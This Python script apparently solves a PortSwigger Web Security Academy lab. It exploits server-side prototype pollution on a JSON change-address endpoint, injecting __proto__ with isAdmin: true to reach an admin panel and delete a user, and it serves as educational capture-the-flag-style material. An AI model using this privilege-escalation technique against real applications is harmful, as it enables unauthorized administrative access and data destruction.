#!/usr/bin/env python3
"""
Privilege escalation via server-side prototype pollution
PortSwigger Web Security Academy -- Server-Side Prototype Pollution

Companion script for the writeup: 01-privilege-escalation.md

What this does:
    Logs in, confirms the /my-account/change-address JSON endpoint merges
    __proto__ keys onto Object.prototype (a throwaway "foo": "bar" property
    reflects back in the response), then pollutes the isAdmin gadget that
    the account page's own client-side JS filters out of display
    (updateAddress.js: .filter(e => e[0] !== 'isAdmin')). Every user object
    in the process -- including our own -- inherits isAdmin: true, which
    unlocks the admin panel used to delete carlos.

Usage:
    python 01-privilege-escalation.py <lab-url>
    e.g. python 01-privilege-escalation.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import json
import re
import sys
import httpx


def _login(client: httpx.Client, base: str, username: str = "wiener", password: str = "peter") -> bool:
    """This lab's login form posts JSON (jsonSubmit()), not a normal form body."""
    r = client.get(f"{base}/login")
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    csrf = m.group(1) if m else ""
    r = client.post(
        f"{base}/login",
        content=json.dumps({"csrf": csrf, "username": username, "password": password}),
        headers={"Content-Type": "application/json"},
        follow_redirects=True,
    )
    return "Log out" in r.text or "my-account" in str(r.url)


def _session_id(client: httpx.Client, base: str) -> str:
    r = client.get(f"{base}/my-account")
    m = re.search(r'name="sessionId"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def _change_address(client: httpx.Client, base: str, session_id: str, pollution: dict) -> httpx.Response:
    """change-address requires a valid sessionId alongside whatever pollution keys we add,
    or it returns 400 regardless of the JSON payload."""
    body = {
        "address_line_1": "111", "address_line_2": "",
        "city": "City", "postcode": "PC1 1PC", "country": "UK",
        "sessionId": session_id,
    }
    body.update(pollution)
    return client.post(
        f"{base}/my-account/change-address",
        content=json.dumps(body),
        headers={"Content-Type": "application/json"},
    )


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    if not _login(client, lab_url):
        print("[-] Login failed")
        return
    print("[+] Logged in as wiener")

    session_id = _session_id(client, lab_url)

    # Detection probe: a harmless throwaway property should not legitimately appear
    # in the response unless the merge is writing our nested object onto Object.prototype.
    r = _change_address(client, lab_url, session_id, {"__proto__": {"foo": "bar"}})
    if '"foo"' in r.text and '"bar"' in r.text:
        print("[+] Pollution confirmed -- 'foo': 'bar' reflected back in the response")
    else:
        print("[-] Reflection probe didn't come back -- continuing anyway")

    # Gadget: isAdmin is the field updateAddress.js deliberately filters out of display.
    r = _change_address(client, lab_url, session_id, {"__proto__": {"isAdmin": True}})
    print(f"[*] isAdmin pollution sent -- status={r.status_code}")

    admin = client.get(f"{lab_url}/admin")
    if admin.status_code != 200:
        print("[-] Admin panel not accessible -- pollution may not have taken effect")
        return
    print("[+] Admin panel accessible")

    m = re.search(r'href="(/admin/delete\?username=carlos)"', admin.text)
    delete_url = f"{lab_url}{m.group(1)}" if m else f"{lab_url}/admin/delete?username=carlos"
    client.get(delete_url)

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- carlos deleted via polluted isAdmin flag.")
    else:
        print("[-] Not solved yet -- check the admin panel manually.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
